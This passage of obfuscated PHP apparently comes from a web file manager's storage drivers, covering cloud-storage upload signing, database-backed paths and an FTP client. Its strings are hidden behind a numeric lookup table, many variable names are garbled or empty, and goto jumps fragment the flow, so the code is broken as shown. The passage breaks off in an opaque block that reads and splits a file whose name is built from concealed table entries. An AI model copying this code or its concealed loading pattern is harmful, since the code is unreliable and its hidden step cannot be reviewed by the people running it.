$”±‘¨[$Èá†[43]] && $Ÿé[$Èá†[1355]] == $”±‘¨[$Èá†[1355]]) { return $Èá†[1356]; } if ($Ÿé[$Èá†[43]] == $Èá†[909] && $”±‘¨[$Èá†[43]] == $Èá†[116]) { return $Èá†[1235]; } if ($Ÿé[$Èá†[43]] == $Èá†[116] && $”±‘¨[$Èá†[43]] == $Èá†[909]) { return $Èá†[117]; } return $Èá†[1357]; } public static function driverType($∆ó) { $Ëåà‹û =& $_SERVER[]; $ = str_replace($Ëåà‹û[1358], $Ëåà‹û[22], strtolower($∆ó->getType())); if ($ == $Ëåà‹û[797] || $ == $Ëåà‹û[1359] || $ == $Ëåà‹û[1360]) { $∆ó = self::defaultDriverInit(); } else { if ($ == $Ëåà‹û[1245] || $ == $Ëåà‹û[1361]) { $∆ó = IO::init($∆ó->pathParse[$Ëåà‹û[1192]]); } } $ = $∆ó->path; $ = str_replace($Ëåà‹û[1358], $Ëåà‹û[22], strtolower($∆ó->getType())); if ($ == $Ëåà‹û[116]) { return array($Ëåà‹û[43] => $Ëåà‹û[116], $Ëåà‹û[1355] => $Ëåà‹û[22], $Ëåà‹û[94] => $, $Ëåà‹û[105] => $∆ó); } return array($Ëåà‹û[43] => $Ëåà‹û[909], $Ëåà‹û[1355] => $∆ó->pathDriver, $Ëåà‹û[94] => $, $Ëåà‹û[105] => $∆ó); } public static function pathDriverType($) { return $ ? self::driverType(IO::init($)) : !1; } public static function pathDriverLocal($ÿû) { $ÿí =& $_SERVER[]; $ﬂ≤ = $ÿû ? self::driverType(IO::init($ÿû)) : !1; return $ﬂ≤[$ÿí[43]] == $ÿí[116] ? !0 : !1; } public static function allowCover($“â‹ã, $»Ä = true) { $⁄æ≈° =& $_SERVER[]; if (is_string($“â‹ã)) { $“â‹ã = IO::info($“â‹ã); } if (!$“â‹ã || $“â‹ã[$⁄æ≈°[43]] == $⁄æ≈°[85] || $“â‹ã[$⁄æ≈°[86]] <= 100) { return !1; } if (isset($“â‹ã[$⁄æ≈°[1362]]) || !$“â‹ã[$⁄æ≈°[94]]) { return !1; } if (isset($“â‹ã[$⁄æ≈°[226]]) && !$“â‹ã[$⁄æ≈°[226]]) { return !1; } static $ÔåÅ = false; if (!$ÔåÅ || !$»Ä) { $·¨ç = self::driverType(IO::init($“â‹ã[$⁄æ≈°[94]])); $ = $·¨ç[$⁄æ≈°[105]]; $ÔåÅ = $⁄æ≈°[194]; if ($·¨ç[$⁄æ≈°[43]] == $⁄æ≈°[116]) { $ÔåÅ = $⁄æ≈°[1363]; } if ($·¨ç[$⁄æ≈°[105]] && is_array($·¨ç[$⁄æ≈°[105]]->config)) { $Á±∏ = $·¨ç[$⁄æ≈°[105]]->config; if (isset($Á±∏[$⁄æ≈°[1364]]) && $Á±∏[$⁄æ≈°[1364]]) { $ÔåÅ = $⁄æ≈°[1363]; } } } return $ÔåÅ == $⁄æ≈°[1363] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Œç) { parent::__construct($Œç); $this->signatureVersion($_SERVER[][241]); } public function uploadFormData($⁄£, $”æ = 3600) { $œÖ =& $_SERVER[]; $ = $œÖ[223]; $ = $œÖ[256]; $∆ó = $œÖ[266]; $Í†ã = gmdate($œÖ[1365], time() + $”æ); $ = (string) time() . $œÖ[81] . (string) (time() + $”æ); $Âõ° = array($œÖ[267] => $Í†ã, $œÖ[270] => array(array($œÖ[272] => $), array($œÖ[271] => $this->bucket), array($œÖ[273], $œÖ[274], $œÖ[22]), array($œÖ[277] => $∆ó), array($œÖ[1366] => $), array($œÖ[1367] => $this->accessKey), array($œÖ[1368] => $))); $Âõ° = json_encode($Âõ°); $Õâ = hash_hmac($œÖ[256], $, $this->secret); $Âê≤ = sha1($Âõ°); $ = hash_hmac($œÖ[256], $Âê≤, $Õâ); $’Ω = array($œÖ[272] => $, $œÖ[277] => $∆ó, $œÖ[285] => base64_encode($Âõ°), $œÖ[1366] => $, $œÖ[1367] => $this->accessKey, $œÖ[1369] => $, $œÖ[1370] => $, $œÖ[206] => $this->getHost()); return $’Ω; } public function fileOutLink($’®) { $ =& $_SERVER[]; if (substr($’®, 0, 7) == $[1371]) { $’® = $[1372] . substr($’®, 7); } header($[172] . $’®); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[][1373]); } public function getPath($Ÿò) { return trim($Ÿò, $_SERVER[][18]); } public function pathFather($) { $¬Å = $this->parse($); $¬Å = $this->infoSimple($); return $¬Å ? $¬Å[$_SERVER[][190]] : !1; } public function pathThis($·Ωû) { $¬Ø = $this->infoSimple($·Ωû); return $¬Ø ? $¬Ø[$_SERVER[][42]] : !1; } public function getPathOuter($ ù) { if (!$ ù) { return $ ù; } $”ã = $this->parse($ ù); return KodIO::make($”ã[$_SERVER[][452]]); } public function copyFolderFromIO($, $ÿî, $, $«Å, $) { $Áº• = $this->model->copyFolderFromIO($, $ÿî, $, $«Å, $); return KodIO::make($Áº•); } public function isParentOf($Œú, $ﬂß”Æ) { return $this->model->isParentOf($Œú, $ﬂß”Æ); } public function mkfile($÷≥, $ = '', $œó = REPEAT_RENAME) { $≈Ü =& $_SERVER[]; $‘ê = $this->parse($÷≥); $÷≥ = $‘ê[$≈Ü[452]]; for ($ÔèÉ = 0; $ÔèÉ < count($‘ê[$≈Ü[1374]]); $ÔèÉ++) { $ = $‘ê[$≈Ü[1374]][$ÔèÉ]; if ($ÔèÉ == count($‘ê[$≈Ü[1374]]) - 1) { $÷≥ = $this->model->mkfile($÷≥, $, $, $œó); break; } $÷≥ = $this->model->mkdir($÷≥, $, REPEAT_SKIP); } return $this->getPathOuter($÷≥); } public function mkdir($ÎÅ§, $œ∂Ã• = REPEAT_SKIP) { $“£ =& $_SERVER[]; $–¨ = $this->parse($ÎÅ§); $ÎÅ§ = $–¨[$“£[452]]; for ($…∑ = 0; $…∑ < count($–¨[$“£[1374]]); $…∑++) { $Œü = $–¨[$“£[1374]][$…∑]; $ÎÅ§ = $this->model->mkdir($ÎÅ§, $Œü, $œ∂Ã•); } return $this->getPathOuter($ÎÅ§); } public function copyFile($œ≤, $, $ = REPEAT_REPLACE) { $ﬁö =& $_SERVER[]; $Œô = $this->parse($); $Óº™ = $this->model->copy($œ≤, $Œô[$ﬁö[452]], $, $Œô[$ﬁö[94]]); return $Óº™ ? $this->getPathOuter($Óº™) : !1; } public function moveFile($, $›å, $ = REPEAT_REPLACE) { $“ò =& $_SERVER[]; $ÕàÁù∂ = $this->parse($›å); $ = $this->model->move($, $ÕàÁù∂[$“ò[452]], $, $ÕàÁù∂[$“ò[94]]); return $ ? $this->getPathOuter($) : !1; } public function copy($”É, $, $”ø = REPEAT_REPLACE, $ﬁö = false) { $·àîŒ• = $this->parse($); $–≤ = $this->model->copy($”É, $·àîŒ•[$_SERVER[][452]], $”ø, $ﬁö); return $–≤ ? $this->getPathOuter($–≤) : !1; } public function moveSameAllow() { } public function move($, $ﬂè, $ å≈§ = REPEAT_REPLACE, $‡±á = false) { $ = $this->parse($ﬂè); $ ´‘ã = $this->model->move($, $[$_SERVER[][452]], $ å≈§, $‡±á); return $ ´‘ã ? $this->getPathOuter($ ´‘ã) : !1; } public function remove($ÎµèŒº, $ = true) { return $this->model->remove($ÎµèŒº, $); } public function rename($Ï•¢, $) { $≈å∆π = $this->model->rename($Ï•¢, $); return $≈å∆π ? $this->getPathOuter($Ï•¢) : $≈å∆π; } public function size($) { $Í∑ú = $this->infoSimple($); return $Í∑ú ? $Í∑ú[$_SERVER[][86]] : 0; } public function infoSimple($) { return $this->model->sourceInfo($); } public function info($›≤) { return $this->infoParse($›≤); } public function infoAuth($) { return $this->infoParse($, !1, !0); } public function infoWithChildren($) { return $this->infoParse($, !0); } protected function infoParse($, $—¢ﬂî = false, $—∂ﬁü = false) { if (!$—¢ﬂî) { return $this->model->pathInfo($, $—∂ﬁü); } return $this->model->pathInfoMore($); } public function infoFullSimple($Ëü∑) { $Õî =& $_SERVER[]; $Î•´ = explode($Õî[18], $Ëü∑); $⁄ä = implode($Õî[18], array_splice($Î•´, 1)); return $this->model->pathInfoByPath($Î•´[0], $⁄ä); } public function infoFull($Ÿâ”ê) { $ = $this->infoFullSimple($Ÿâ”ê); return is_array($) ? $this->model->pathInfo($[$_SERVER[][191]]) : !1; } public function hashSimple($) { $ =& $_SERVER[]; $⁄¢ﬁ¨ = $this->infoWithChildren($); return $⁄¢ﬁ¨[$[525]][$[649]]; } public function hashMd5($œÇ) { $ =& $_SERVER[]; $€≥ = $this->infoWithChildren($œÇ); return $€≥[$[525]][$[650]]; } public function exist($) { $ =& $_SERVER[]; $”• = $this->parse($); if (!$”•[$[94]]) { return $this->isFile($) || $this->isFolder($); } $ = array($[454] => $”•[$[452]], $[42] => $”•[$[94]]); $ = $this->model->where($)->find(); return $ ? !0 : !1; } public function isFile($÷ì) { $Œ† =& $_SERVER[]; $»≤ = $this->infoSimple($÷ì); return $»≤ && $»≤[$Œ†[462]] == $Œ†[222] ? !0 : !1; } public function isFolder($) { $’Ø =& $_SERVER[]; $ = $this->infoSimple($); return $ && $[$’Ø[462]] == $’Ø[98] ? !0 : !1; } public function listPath($, $Ô∞ô = false) { $ﬂπ =& $_SERVER[]; if ($ == $ﬂπ[22]) { return !1; } $ = array($ﬂπ[454] => $); if ($Ô∞ô) { return $this->model->listSource($, -1); } return $this->model->listSource($); } public function has($œß, $€óÕ• = false, $÷Ö = null) { $ =& $_SERVER[]; $ = $this->infoWithChildren($œß); if ($€óÕ•) { return array($[234] => $[$[234]], $[233] => $[$[233]]); } return $÷Ö ? $[$[234]] : $[$[233]]; } public function listAll($√Æ) { $Œ® = IO::info($this->pathParse[$_SERVER[][94]]); if (!$Œ®) { return array(); } return $this->model->listAll($√Æ); } public function getContent($) { return $this->model->getContent($); } public function setContent($⁄õ, $Ãí = '') { return $this->model->setContent($⁄õ, $Ãí); } public function fileSubstr($, $ﬂÄ, $ ü) { return $this->model->fileSubstr($, $ﬂÄ, $ ü); } public function download($–∑, $ = '') { $Àõ = get_path_father($); $Îàõ¬Ω = get_path_this($); $ = $this->model->fileInfoGet($–∑); $√π © = IO::copy($[$_SERVER[][94]], $Àõ, !1, $Îàõ¬Ω); return $√π ©; } public function setModifyTime($Ã£, $—Ø = '') { $∆ù =& $_SERVER[]; if (!$Ã£) { return; } $this->model->where(array($∆ù[468] => $Ã£))->save(array($∆ù[95] => $—Ø)); } public function upload($, $, $ = false, $Ÿâ = REPEAT_REPLACE) { $⁄ú =& $_SERVER[]; $‹Ø = $this->parse($); $◊ì = $this->model->addFile($‹Ø[$⁄ú[452]], $, $‹Ø[$⁄ú[94]], $, $Ÿâ); return $this->getPathOuter($◊ì); } public function uploadFileByID($–¨, $, $◊ó) { $›± =& $_SERVER[]; $œ® = $this->parse($–¨); $ = $this->model->addFileByFileID($œ®[$›±[452]], $, $œ®[$›±[94]], $◊ó); return $this->getPathOuter($); } public function addFileByRemote($, $∆Ñ, $Ï´î = array(), $ÿç = '', $…¥) { $ =& $_SERVER[]; $ = $this->parse($); $ÿç = empty($ÿç) ? $[$[94]] : $ÿç; $ = $this->model->addFileByRemote($[$[452]], $∆Ñ, $ÿç, $Ï´î, $…¥); return $this->getPathOuter($); } public function uploadLink($”º¬ß, $ﬁÅ = 0) { $“à∆™ =& $_SERVER[]; $ﬂö = $this->parse($”º¬ß); $⁄ò = _get($GLOBALS[$“à∆™[17]], $“à∆™[1375]); $Õê = _get($GLOBALS[$“à∆™[17]], $“à∆™[1376]); $”º¬ß = Model($“à∆™[652])->createFileName($ﬂö[$“à∆™[94]], $⁄ò, $Õê); return IO::uploadLink($”º¬ß, $ﬁÅ); } public function fileNameAuto($”ã, $, $ﬂü = REPEAT_REPLACE, $Œ∫ = false) { return $this->model->fileNameAuto($”ã, $, $ﬂü, $Œ∫); } public function fileNameExist($, $) { return $this->model->fileNameExist($, $); } protected function _fileOut($, $ = false, $‹§◊Å = false, $–à = '', $√à = false) { $ =& $_SERVER[]; $ = $this->model->sourceInfo($); if ($[$[462]] == $[98]) { header($[1377]); die; } $Î∞ô = $this->model->fileInfoGet($); $–à = $Î∞ô[$[650]] ? $Î∞ô[$[650]] : $–à; $ = is_array($GLOBALS[$[179]]) ? $GLOBALS[$[179]][$[42]] : $[$[42]]; if ($√à) { return IO::fileOutServer($Î∞ô[$[94]], $, $, $–à); } IO::fileOut($Î∞ô[$[94]], $, $, $–à); } public function fileOut($‰å®, $∆Ñ = false, $ = false, $ = '') { $this->_fileOut($‰å®, $∆Ñ, $, $); } public function fileOutServer($ÍÉ≠, $ = false, $Í¥Ñ = false, $¬åÏûµ = '') { $this->_fileOut($ÍÉ≠, $, $Í¥Ñ, $¬åÏûµ, !0); } protected function _fileOutImage($ƒ∫€ó, $·æ´ = 250) { $ =& $_SERVER[]; $ÓππÃ™ = $this->model->pathInfo($ƒ∫€ó); if ($ÓππÃ™[$[462]] == $[98]) { show_json($[1378] . $ƒ∫€ó, !1); } $ = $this->model->fileInfoGet($ƒ∫€ó); $ÓππÃ™[$[180]] = $[$[94]]; $GLOBALS[$[179]] = $ÓππÃ™; IO::fileOutImage($[$[94]], $·æ´); } public function fileOutImage($, $Õï = 250) { $this->_fileOutImage($, $Õï); } public function fileOutImageServer($…Ü≈í, $ © = 250) { $this->_fileOutImage($…Ü≈í, $ ©); } public function link($Èê§…Å, $ = '') { $∆∑ = $this->model->fileInfoGet($Èê§…Å); return IO::link($∆∑[$_SERVER[][94]], $); } protected function parse($) { $◊§ =& $_SERVER[]; if (strstr($, $◊§[18]) === !1) { return array($◊§[470] => intval($), $◊§[94] => $◊§[22], $◊§[1374] => array()); } $⁄â€ª = explode($◊§[18], trim($, $◊§[18])); if (count($⁄â€ª) < 2) { show_tips(clear_html($) . $◊§[1379]); } return array($◊§[470] => intval($⁄â€ª[0]), $◊§[94] => $⁄â€ª[1], $◊§[1374] => array_slice($⁄â€ª, 1)); } } goto d‚èΩ; Fƒ§: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($‘ú) { $this->pathParse = $‘ú; } protected function infoParse($∆¶, $ ª = false) { $ =& $_SERVER[]; return Action($[1215])->sharePathInfo($this->pathParse[$[94]], !0, $ ª); } public function listPath($Ãû, $ = false) { $Ê†ã =& $_SERVER[]; $ = IO::listPath($Ãû, $); if (!$) { return $; } if (is_array($[$Ê†ã[1381]])) { $–∂ = Action($Ê†ã[1390])->parsePathChildren($[$Ê†ã[1381]], array($Ê†ã[472] => $Ãû)); $[$Ê†ã[1381]] = Action($Ê†ã[1215])->shareItemInfo($–∂); } foreach ($ as $◊é => $ÈâΩ) { if (!in_array($◊é, array($Ê†ã[93], $Ê†ã[92]))) { continue; } foreach ($ÈâΩ as $ => $–∂) { $–∂ = Action($Ê†ã[1390])->parsePathChildren($–∂, array($Ê†ã[472] => $Ãû)); $[$◊é][$] = Action($Ê†ã[1215])->shareItemInfo($–∂); } } return $; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($√Ä) { parent::__construct($√Ä); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($) { parent::__construct($); $this->signatureVersion($_SERVER[][241]); } public function uploadFormData($, $»ß = 3600) { $»ß =& $_SERVER[]; $»Ü = $»ß[223]; $Ïô∑ = $»ß[262]; $‡´â = $»ß[72]; $ = gmdate($»ß[263]); $⁄êÀ• = gmdate($»ß[264]); $Íôß = $»ß[265]; $ = $»ß . $»ß[22]; $÷≠ = $»ß[266]; $ = array($this->accessKey, $⁄êÀ•, $this->region, $‡´â, $Íôß); $ÀΩ = implode($»ß[18], $); $ = array($»ß[267] => gmdate($»ß[1365], strtotime($»ß[269])), $»ß[270] => array(array($»ß[271] => $this->bucket), array($»ß[272] => $»Ü), array($»ß[273], $»ß[274], $»ß[22]), array($»ß[273], $»ß[275], $»ß[22]), array($»ß[273], $»ß[276], $»ß[22]), array($»ß[277] => $÷≠), array($»ß[278] => $ÀΩ), array($»ß[279] => $Ïô∑), array($»ß[280] => $), array($»ß[281] => $))); $ = base64_encode(json_encode($)); $ = hash_hmac($»ß[282], $⁄êÀ•, $»ß[283] . $this->secret, !0); $ƒØ = hash_hmac($»ß[282], $this->region, $, !0); $ = hash_hmac($»ß[282], $‡´â, $ƒØ, !0); $”∂Íöæ = hash_hmac($»ß[282], $Íôß, $, !0); $ = hash_hmac($»ß[282], $, $”∂Íöæ); $ = array($»ß[240] => $»ß[22], $»ß[284] => $»ß[22], $»ß[272] => $»Ü, $»ß[277] => $÷≠, $»ß[285] => $, $»ß[286] => $ÀΩ, $»ß[287] => $Ïô∑, $»ß[288] => $, $»ß[289] => $, $»ß[290] => $, $»ß[206] => $this->getHost()); return $; } } goto F“Ö; F“Ö: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($) { parent::__construct(); if (count($) > 0) { $this->_init($); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($) { $¬ù =& $_SERVER[]; global $config; $this->appCharset = $config[$¬ù[1391]]; $this->systemCharset = $config[$¬ù[1392]]; if (isset($[$¬ù[1393]]) && $[$¬ù[1393]]) { $this->systemCharset = $[$¬ù[1393]]; } } public function iconvApp($ • Æ) { return $this->iconvTo($ • Æ, $this->systemCharset, $this->appCharset); } public function iconvSystem($) { return $this->iconvTo($, $this->appCharset, $this->systemCharset); } public function getPathOuter($) { $Ÿ´ =& $_SERVER[]; $…≥ = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($…≥, 0, 2) == $Ÿ´[1394]) { $…≥ = BASIC_PATH . substr($…≥, 2); } if (substr($, 0, 2) == $Ÿ´[1394]) { $ = BASIC_PATH . substr($, 2); } $…≥ = KodIO::clear($…≥); $ = KodIO::clear($); $ = substr($, strlen($…≥)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $Ÿ´[18] . ltrim($, $Ÿ´[18]); } private function _init($ÓÅ≤ = array()) { $ =& $_SERVER[]; if (!function_exists($[1395])) { throw new Exception(LNG($[1396])); } $this->config = $ÓÅ≤; $this->charsetReset($ÓÅ≤); foreach ($ÓÅ≤ as $ => $Ô†∏) { if (isset($this->{$})) { $this->{$} = $Ô†∏; } } return $this->_login($ÓÅ≤); } private function _login($) { $ÀÖ =& $_SERVER[]; static $“≤ = array(); $ÿ¨ = md5(json_encode($)); if (isset($“≤[$ÿ¨])) { foreach ($“≤[$ÿ¨] as $›ì => $Ÿ¨) { $this->{$›ì} = $Ÿ¨; } return !0; } $Ïäæ = parse_url(trim($this->server, $ÀÖ[18])); $this->host = $Ïäæ[$ÀÖ[206]]; $‰≥¥ = isset($Ïäæ[$ÀÖ[205]]) && $Ïäæ[$ÀÖ[205]] == $ÀÖ[1397] ? !0 : !1; $this->scheme = $‰≥¥ ? $ÀÖ[1398] : $ÀÖ[1399]; $this->port = isset($Ïäæ[$ÀÖ[207]]) ? $Ïäæ[$ÀÖ[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $«é = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $›≠ = $this->pasv == $ÀÖ[98] ? !0 : !1; @ftp_pasv($this->connect, $›≠); $“≤[$ÿ¨] = array($ÀÖ[1400] => $this->connect, $ÀÖ[206] => $this->host, $ÀÖ[205] => $this->scheme, $ÀÖ[207] => $this->port); return $«é; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($œä, $ = '', $ = REPEAT_RENAME) { if ($this->setContent($œä, $)) { return $this->getPathOuter($œä); } return !1; } public function mkdir($¬∑, $Íãê = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¬∑ = $this->iconvSystem($¬∑); if ($this->_isFolder($¬∑) || @ftp_mkdir($this->connect, $¬∑)) { return $this->getPathOuter($¬∑); } if (!$this->mkdir($this->pathFather($¬∑))) { return !1; } if ($¬∑ = @ftp_mkdir($this->connect, $¬∑)) { return $this->getPathOuter($¬∑); } return !1; } public function copyFile($€è, $Ùãá∑) { if (!$this->_isconn()) { return !1; } $ﬁ† = $this->pathThis($this->iconvSystem($€è)); $ = $this->tempFile($ﬁ†); $Õ≠ = $this->iconvApp($); $this->download($€è, $Õ≠); $ÿÄ = $this->upload($Ùãá∑, $Õ≠); $this->tempFileRemve($); return $ÿÄ; } public function moveFile($Â™¨…Ç, $Œò»ë) { if (!$this->_isconn()) { return !1; } $Â™¨…Ç = $this->iconvSystem($Â™¨…Ç); $Œò»ë = $this->iconvSystem($Œò»ë); $ƒæ = @ftp_rename($this->connect, $Â™¨…Ç, $Œò»ë); return $ƒæ ? $this->getPathOuter($Œò»ë) : !1; } public function delFile($∆∂) { if (!$this->_isconn()) { return !1; } $∆∂ = $this->iconvSystem($∆∂); return @ftp_delete($this->connect, $∆∂); } public function delFolder($‚™û) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ = $‹® = array(); $this->fileList($‚™û, $, $‹®, !0); $this->listItemCache = !0; foreach ($‹® as $–¥€™) { $ = $this->iconvSystem($–¥€™[$_SERVER[][42]]); $ = @ftp_delete($this->connect, $); if (!$) { return !1; } } foreach ($ as $) { $ = $this->iconvSystem($); $ = @ftp_rmdir($this->connect, $); if (!$) { return !1; } } $‚™û = $this->iconvSystem($‚™û); return @ftp_rmdir($this->connect, $‚™û); } public function rename($Àµ, $Êï≠) { $ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $À∫ = $this->fileNameAuto($this->pathFather($Àµ), $Êï≠); $À∫ = $this->iconvSystem($À∫); $Àµ = $this->iconvSystem($Àµ); $Àé = $this->pathFather($Àµ); $ÕìÃÖ = rtrim($Àé, $[18]) . $[18] . $À∫; $ = @ftp_rename($this->connect, $Àµ, $ÕìÃÖ); $ÕìÃÖ = $this->iconvApp($ÕìÃÖ); return $ ? $this->getPathOuter($ÕìÃÖ) : !1; } private function folderInfo($€ñ, $Õñ = false) { $»¥ =& $_SERVER[]; $Ÿµ = array($»¥[42] => $this->pathThis($€ñ), $»¥[94] => $this->getPathOuter($»¥[18] . $€ñ), $»¥[43] => $»¥[85]); if ($Õñ) { return $Ÿµ; } $Ÿµ[$»¥[225]] = $Ÿµ[$»¥[95]] = 0; $Ÿµ[$»¥[226]] = $Ÿµ[$»¥[227]] = !0; return $Ÿµ; } private function fileInfo($›é, $ = false, $“æ = array()) { $Àã =& $_SERVER[]; $Œã = array($Àã[42] => $this->pathThis($›é), $Àã[94] => $this->getPathOuter($Àã[18] . $›é), $Àã[43] => $Àã[224], $Àã[86] => isset($“æ[$Àã[86]]) ? $“æ[$Àã[86]] : 0, $Àã[185] => $this->ext($›é)); if ($) { return $Œã; } $Œã[$Àã[225]] = $Œã[$Àã[95]] = 0; $Œã[$Àã[226]] = $Œã[$Àã[227]] = !0; $Õã = $this->iconvSystem($›é); $Œã[$Àã[95]] = @ftp_mdtm($this->connect, $Õã); if (empty($“æ)) { $“æ = $this->objectMeta($›é); if (!$“æ) { return $Œã; } } $Œã[$Àã[86]] = $“æ[$Àã[86]]; return $Œã; } public function size($√©) { $ = $this->objectMeta($√©); return $ ? $[$_SERVER[][86]] : 0; } public function info($›∫) { if ($this->isFile($›∫)) { return $this->fileInfo($›∫, 0); } else { if ($this->isFolder($›∫)) { return $this->folderInfo($›∫); } } return !1; } private function fileList($, &$›•, &$‚ó§, $ = false) { $·ñª =& $_SERVER[]; $ = $this->iconvSystem($); if (!$this->isFolder($)) { return !1; } @ftp_chdir($this->connect, $·ñª[18]); $ = rtrim($, $·ñª[18]) . $·ñª[18]; check_abort(); $ = @ftp_rawlist($this->connect, $); if (!$) { $ = array(); } $ = array($·ñª[20] => 1, $·ñª[1319] => 1); foreach ($ as $) { $ = $this->_listItem($); if ($[0] == $·ñª[798]) { continue; } $›¢Ãå = $[8]; if (empty($›¢Ãå) && $›¢Ãå !== $·ñª[222] || isset($[$›¢Ãå])) { continue; } $›¢Ãå = $this->iconvApp($ . ltrim($›¢Ãå, $·ñª[18])); $ﬂû = array($·ñª[42] => $›¢Ãå, $·ñª[43] => $·ñª[224], $·ñª[86] => $[4]); if (substr($, 0, 1) == $·ñª[1401]) { $ﬂû[$·ñª[43]] = $·ñª[85]; $ﬂû[$·ñª[86]] = 0; } $ = $ﬂû[$·ñª[43]] == $·ñª[85] ? !0 : !1; $this->cacheMethodInfoSet($›¢Ãå, $, $ﬂû); if ($) { $›•[] = $›¢Ãå; if ($) { $this->fileList($›¢Ãå, $›•, $‚ó§, $); } continue; } $‚ó§[] = $ﬂû; } $this->cacheMethodInfoSet($, !0); } private function _listItem($) { if (empty($)) { return array(); } $·∏ø = preg_split($_SERVER[][1402], $); if (count($·∏ø) <= 9) { return $·∏ø; } $·∏ø[8] = trim(substr($, strpos($, $·∏ø[7]) + strlen($·∏ø[7]))); return array_splice($·∏ø, 0, 9); } public function listPath($Ó∑ûƒª, $—´ = false) { $ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $…∑ = $ = array(); $this->fileList($Ó∑ûƒª, $…∑, $); foreach ($…∑ as $÷Ä => $⁄é) { $…∑[$÷Ä] = $this->folderInfo($⁄é, $—´); } foreach ($ as $÷Ä => $⁄é) { $[$÷Ä] = $this->fileInfo($⁄é[$[42]], $—´, $⁄é); } return array($[92] => $…∑, $[93] => $); } public function has($Û≠úö, $ÁèÅ = false, $‹É = true) { $¬±‹° =& $_SERVER[]; $ = $Ÿß = array(); $ = $ÁèÅ ? !0 : !1; $this->fileList($Û≠úö, $, $Ÿß, $); if ($ÁèÅ) { return array($¬±‹°[233] => count($Ÿß), $¬±‹°[234] => count($)); } if ($‹É) { if (count($Ÿß)) { return !0; } } else { if (count($)) { return !0; } } return !1; } public function listAll($–∫) { $Œò =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $ = $ = array(); $this->fileList($–∫, $, $, !0); $ = array_to_keyvalue($, $Œò[42]); foreach ($ as $ÃÇ) { if (is_string($ÃÇ)) { $[$ÃÇ] = array($Œò[86] => 0); } } return $this->listAllFiles($–∫, $); } public function getContent($Âò´) { if (!$this->_isconn()) { return !1; } $Âò´ = $this->iconvSystem($Âò´); return $this->fileSubstr($Âò´); } public function setContent($ﬂ£, $ = '') { if (!$this->_isconn()) { return !1; } $ = $this->pathThis($this->iconvSystem($ﬂ£)); $…à = $this->tempFile($); file_put_contents($…à, $); $ = $this->upload($ﬂ£, $this->iconvApp($…à)); $this->tempFileRemve($…à); return $; } public function fileSubstr($≈≥, $‰ìµ = 0, $ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($≈≥, $‰ìµ, $); } private function ftpRequest($‡¨≠Ÿ£, $Ïú≠ = 0, $ = false) { $‡¨≠Ÿ£ = $this->iconvSystem($‡¨≠Ÿ£); $ÏÆø = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $ = curl_init(); curl_setopt($, CURLOPT_URL, $ÏÆø . $this->pathEncode($‡¨≠Ÿ£)); curl_setopt($, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($) { $Ôáñ = $Ïú≠ + $ - 1; curl_setopt($, CURLOPT_RANGE, "{$Ïú≠}\x2d{$Ôáñ}"); } curl_setopt($, CURLOPT_RETURNTRANSFER, 1); $Õ∞ = curl_exec($); curl_close($); return $Õ∞; } public function upload($, $Ô¢ø, $‹å = false, $’¶ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($))) { return !1; } $ = $this->iconvSystem($); $Ô¢ø = $this->iconvSystem($Ô¢ø); $ = ftp_nb_put($this->connect, $, $Ô¢ø, FTP_BINARY); while ($ == FTP_MOREDATA) { $ = ftp_nb_continue($this->connect); } if ($ != FTP_FINISHED) { return !1; } return $this->getPathOuter($); } public function download($, $ = '') { if (!$this->_isconn()) { return !1; } $…Ä = $this->pathFather($); if (!IO::mkdir($…Ä)) { return !1; } $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ﬁ† = ftp_nb_get($this->connect, $, $, FTP_BINARY); while ($ﬁ† == FTP_MOREDATA) { $ﬁ† = ftp_nb_continue($this->connect); } if ($ﬁ† != FTP_FINISHED) { return !1; } return $this->iconvApp($); } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($ﬂé◊é) { return !$this->isFolder($ﬂé◊é) && $this->objectMeta($ﬂé◊é); } public function isFolder($À¥) { return $this->cacheMethod($_SERVER[][176], $À¥); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[][178], $); } protected function _objectMeta($) { $ =& $_SERVER[]; if ($ == $[22] || $ == $[18]) { return array(); } if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); $…ö = array($[42] => $this->iconvApp($), $[43] => $[224], $[86] => 0); @ftp_chdir($this->connect, $[18]); $ = @ftp_size($this->connect, $); if ($ != -1) { $…ö[$[86]] = $; } else { $ÿ≠◊º = @ftp_chdir($this->connect, $); if (!$ÿ≠◊º) { return !1; } $…ö[$[43]] = $[85]; } return $…ö; } protected function _isFolder($Ïà¨) { $ =& $_SERVER[]; if ($Ïà¨ == $[22] || $Ïà¨ == $[18]) { return !0; } $ = $this->_objectMeta($Ïà¨); return isset($[$[43]]) && $[$[43]] == $[85] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[][6]]) || !isset($_SERVER[$_SERVER[][15]])) { $_getc = $_SERVER[][8]; $_getfile = $_SERVER[$_SERVER[][9]] . $_SERVER[][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][11], $_getfilec); if (count($_getarrs) < 